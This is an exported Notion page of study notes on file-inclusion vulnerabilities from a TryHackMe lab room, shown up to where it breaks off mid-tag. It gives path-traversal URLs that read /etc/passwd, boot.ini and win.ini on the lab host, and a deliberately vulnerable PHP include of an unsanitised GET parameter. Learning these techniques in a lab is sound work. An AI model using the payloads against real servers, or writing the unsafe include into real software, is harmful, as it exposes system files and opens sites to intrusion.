@@ -1,0 +1,738 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Intro into Web Hacking - File Inclusion</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2563eecd-ed53-80e4-955a-f4045a407803" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/gradients_5.png" style="object-position:center 40%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="LazyAdmin/favicon.png"/></div><h1 class="page-title" dir="auto">Intro into Web Hacking - File Inclusion</h1><p class="page-description" dir="auto"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/list_gray.svg" style="width:14px;height:14px;display:block"/></span>Category</th><td><span class="selected-value select-value-color-red">Boot2Root</span><span class="selected-value select-value-color-yellow">Linux</span><span class="selected-value select-value-color-red">Red Team</span><span class="selected-value select-value-color-red">Web</span></td></tr><tr class="property-row property-row-file"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/attachment_gray.svg" style="width:14px;height:14px;display:block"/></span>Cover Image</th><td><span style="margin-inline-end:6px"><a href="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/5e2656cb5a909ddf63395dd7e7a377ad.png"><img style="width:20px;max-height:24px" src="Intro%20into%20Web%20Hacking%20-%20File%20Inclusion/5e2656cb5a909ddf63395dd7e7a377ad.png" alt="5e2656cb5a909ddf63395dd7e7a377ad.png"/></a></span></td></tr><tr class="property-row property-row-date"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/calendar_gray.svg" style="width:14px;height:14px;display:block"/></span>Date Completed</th><td><time>@November 9, 2025</time></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/arrow-circle-down_gray.svg" style="width:14px;height:14px;display:block"/></span>Difficulty</th><td><span class="selected-value select-value-color-green">Easy</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/arrow-circle-down_gray.svg" style="width:14px;height:14px;display:block"/></span>Platform</th><td><span class="selected-value select-value-color-green">TryHackMe</span></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/list_gray.svg" style="width:14px;height:14px;display:block"/></span>Skills Learned</th><td><span class="selected-value select-value-color-purple">BurpSuite</span><span class="selected-value select-value-color-default">LFI</span><span class="selected-value select-value-color-default">Path Traversal</span><span class="selected-value select-value-color-blue">Remote File Inclusion(RFI)</span></td></tr><tr class="property-row property-row-status"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/burst_gray.svg" style="width:14px;height:14px;display:block"/></span>Status</th><td><span class="status-value select-value-color-green"><div class="status-dot status-dot-color-green"></div>Done</span></td></tr></tbody></table></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2573eecd-ed53-803b-9ed1-e552a8738cbb" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-8018-94db-ea68446432dd">Path Traversal</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-8001-abb0-dd6e925a7349">LFI</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-800e-9f2b-c23448aa3a62">Remote File Inclusion RFI</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-80f3-85ef-c0cd94017bc8">Remediation</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-806b-a8ec-c2a8c08bb5cb">Lab#1</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-80bd-83e9-fdae6eed6541">Lab#2</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-80cc-9377-ee82c16301f4">Lab#3</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-80df-8d72-e27b18204d50">Lab#4</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-803a-9734-e15d4e50f847">Lab#5</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-8052-9161-c7e2a90d8e0c">Lab#6</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-805e-9153-fe7baec3f045">Challenges</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-8021-a83f-f24cbfe4bd7d">Lab#Challege1</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-8082-b819-e09a8e369751">Lab#Challege2</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-80ab-9bc6-fc2b444ba039">Lab#Challenge3</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2573eecd-ed53-80e8-89c7-c7dac73cad99">RFI</a></div></nav></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80f7-b283-e2ca3528ad3e" class="">File Inclusion vulnerability happens when a user can retrieve or execute command of their own because the input to the file is not sanitized properly, mostly in PHP. They could retrieve sensitive files or even perform remote code execution.</p></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-8018-94db-ea68446432dd" class="">Path Traversal</h2></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80ec-9bf6-f5acda72de0f" class="">The function in php that causes this vulnerability is file_get_contents, if the input is not sanitized properly.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-800a-b683-ec344ea74d05" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">http://webapp.thm/get.php?file=/var/www/app/CVs/userCV.pdf - normal input
+http://webapp.thm/get.php?file=../../../../etc/passwd - path traversal or dot dot dash attack.</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8033-ba7f-da71e0e897f4" class="">If the server is windows based then the file to retrieve is window.ini or boot.ini.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-8001-a8b0-d47e53c1e7f1" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">http://webapp.thm/get.php?file=../../../../boot.ini
+http://webapp.thm/get.php?file=../../../../windows/win.ini</code></pre></div><div style="display:contents" dir="auto"><h2 id="2573eecd-ed53-8001-abb0-dd6e925a7349" class="">LFI</h2></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-80c2-98cf-d6923a48ff44" class="">When developer includes these functions without security awareness,</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-805b-a691-c1d4839b6bf8" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">include
+require
+include_once
+require-once</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-80a2-9215-d6196a50c236" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?PHP 
+	include($_GET[&quot;lang&quot;]);
+?&gt;
+http://webapp.thm/index.php?lang=EN.php - To load english page
+http://webapp.thm/index.php?lang=AR.php - To load arabic page</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8081-85de-c72a88768a8c" class="">This php includes file based on the language that is requested.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2573eecd-ed53-806d-a56d-d6e845dd1391" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">http://webapp.thm/get.php?file=/etc/passwd</code></pre></div><div style="display:contents" dir="auto"><p id="2573eecd-ed53-8036-9f39-eb0b2369b233" class="">This works because there is no directory mentioned in the include and no input validation.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 